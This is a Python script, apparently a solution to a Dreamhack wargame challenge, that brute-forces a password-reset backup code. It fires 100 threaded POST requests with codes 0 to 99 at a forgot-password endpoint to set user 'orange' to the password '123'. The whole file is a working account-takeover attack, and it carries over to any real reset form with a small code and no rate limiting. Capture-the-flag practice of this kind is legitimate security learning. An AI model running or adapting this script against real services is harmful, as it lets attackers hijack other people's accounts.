import requests
import threading

target_url = "http://host1.dreamhack.games:15094/forgot_password"
target_userid = "orange"
new_password = "123"

def send_request(i):
    data = {
        "userid": target_userid,
        "newpassword": new_password,
        "backupCode": i
    }
    try:
        res = requests.post(target_url, data=data, timeout=3)
        if "Password Change Success" in res.text:
            print(f"Changed password with backupCode: {i}")
    except Exception as e:
        print(f"[{i}] Error: {e}")

threads = []

for i in range(100):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

# wait for all threads to finish
for t in threads:
    t.join()

print("All requests sent.")